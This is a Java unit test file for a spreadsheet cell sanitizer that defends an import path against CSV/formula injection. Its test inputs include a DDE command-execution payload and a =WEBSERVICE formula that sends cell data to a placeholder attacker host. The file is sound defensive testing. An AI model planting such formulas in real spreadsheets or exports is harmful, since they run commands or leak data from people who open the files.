package com.nulogic.common.util;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.test.util.ReflectionTestUtils;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Unit tests for {@link CellValueSanitizer} covering the OWASP A03
 * (CSV / formula injection) guard surface on the IMPORT path. The
 * symmetric guard on the EXPORT path lives in
 * {@code com.nulogic.common.export.ExportService}; these tests do NOT
 * cover that path &mdash; sprint-3 owns it.
 *
 * <p>Coverage matrix:
 * <ul>
 *   <li>All six leading formula-trigger chars: {@code = + - @ \t \r}</li>
 *   <li>Both modes: {@code prefix} (default) and {@code strip}</li>
 *   <li>Strict variant: rejection by returning {@code null}</li>
 *   <li>Negative cases: null/empty/safe values pass through unchanged</li>
 * </ul>
 */
@DisplayName("CellValueSanitizer — OWASP A03 / CWE-1236 formula-injection guard")
class CellValueSanitizerTest {

    private CellValueSanitizer sanitizer;

    @BeforeEach
    void setUp() {
        sanitizer = new CellValueSanitizer();
        // Default mode is prefix (matches @Value default in the bean)
        ReflectionTestUtils.setField(sanitizer, "mode", CellValueSanitizer.MODE_PREFIX);
    }

    @Nested
    @DisplayName("sanitize() — default prefix mode")
    class PrefixMode {

        @ParameterizedTest(name = "leading char ''{0}'' is prefixed")
        @ValueSource(strings = {"=", "+", "-", "@", "\t", "\r"})
        void prefixesEachFormulaLeadingChar(String lead) {
            String input = lead + "cmd|'/c calc'!A1";
            String result = sanitizer.sanitize(input);
            assertThat(result)
                    .as("formula-leading char should be prefixed with single quote")
                    .startsWith("'")
                    .isEqualTo("'" + input);
        }

        @Test
        @DisplayName("classic =WEBSERVICE attack is neutralised")
        void prefixesWebserviceAttack() {
            String attack = "=WEBSERVICE(\"https://evil.example.com/?d=\"&A1)";
            assertThat(sanitizer.sanitize(attack)).isEqualTo("'" + attack);
        }

        @Test
        @DisplayName("DDE-style attack is neutralised")
        void prefixesDdeAttack() {
            String attack = "@SUM(1+9)*cmd|'/c calc'!A1";
            assertThat(sanitizer.sanitize(attack)).isEqualTo("'" + attack);
        }

        @Test
        @DisplayName("safe value passes through unchanged")
        void doesNotTouchSafeValues() {
            assertThat(sanitizer.sanitize("John Doe")).isEqualTo("John Doe");
            assertThat(sanitizer.sanitize("EMP001")).isEqualTo("EMP001");
            assertThat(sanitizer.sanitize("john.doe@company.com")).isEqualTo("john.doe@company.com");
            assertThat(sanitizer.sanitize("123")).isEqualTo("123");
        }

        @Test
        @DisplayName("null and empty pass through unchanged")
        void handlesNullAndEmpty() {
            assertThat(sanitizer.sanitize(null)).isNull();
            assertThat(sanitizer.sanitize("")).isEmpty();
        }

        @Test
        @DisplayName("formula-trigger char in middle of string is allowed")
        void doesNotPrefixMiddleChars() {
            // CSV injection requires the lead char to be FIRST — middle is fine.
            assertThat(sanitizer.sanitize("A=B")).isEqualTo("A=B");
            assertThat(sanitizer.sanitize("price-tag")).isEqualTo("price-tag");
            assertThat(sanitizer.sanitize("user@host")).isEqualTo("user@host");
        }
    }

    @Nested
    @DisplayName("sanitize() — strip mode")
    class StripMode {

        @BeforeEach
        void switchToStrip() {
            ReflectionTestUtils.setField(sanitizer, "mode", CellValueSanitizer.MODE_STRIP);
        }

        @ParameterizedTest(name = "leading char ''{0}'' is stripped")
        @ValueSource(strings = {"=", "+", "-", "@", "\t", "\r"})
        void stripsEachFormulaLeadingChar(String lead) {
            assertThat(sanitizer.sanitize(lead + "value")).isEqualTo("value");
        }

        @Test
        @DisplayName("strips multiple consecutive formula-trigger chars")
        void stripsMultipleLeadingChars() {
            assertThat(sanitizer.sanitize("=+=cmd")).isEqualTo("cmd");
            assertThat(sanitizer.sanitize("--SUM(1+1)")).isEqualTo("SUM(1+1)");
        }

        @Test
        @DisplayName("safe value passes through unchanged in strip mode too")
        void doesNotTouchSafeValuesInStripMode() {
            assertThat(sanitizer.sanitize("hello")).isEqualTo("hello");
        }
    }

    @Nested
    @DisplayName("sanitizeStrict() — reject (return null) for identity/ID fields")
    class StrictMode {

        @ParameterizedTest(name = "leading char ''{0}'' is rejected (null)")
        @ValueSource(strings = {"=", "+", "-", "@", "\t", "\r"})
        void rejectsEachFormulaLeadingChar(String lead) {
            assertThat(sanitizer.sanitizeStrict(lead + "ATTACK"))
                    .as("strict mode returns null for formula-leading input")
                    .isNull();
        }

        @Test
        @DisplayName("safe employee code passes through")
        void passesSafeCode() {
            assertThat(sanitizer.sanitizeStrict("EMP001")).isEqualTo("EMP001");
            assertThat(sanitizer.sanitizeStrict("John Doe")).isEqualTo("John Doe");
        }

        @Test
        @DisplayName("null and empty pass through unchanged")
        void handlesNullAndEmpty() {
            assertThat(sanitizer.sanitizeStrict(null)).isNull();
            assertThat(sanitizer.sanitizeStrict("")).isEmpty();
        }

        @Test
        @DisplayName("safe value with internal special chars is allowed")
        void allowsInternalSpecialChars() {
            assertThat(sanitizer.sanitizeStrict("user@host.com")).isEqualTo("user@host.com");
            assertThat(sanitizer.sanitizeStrict("part-A=B")).isEqualTo("part-A=B");
        }
    }
}
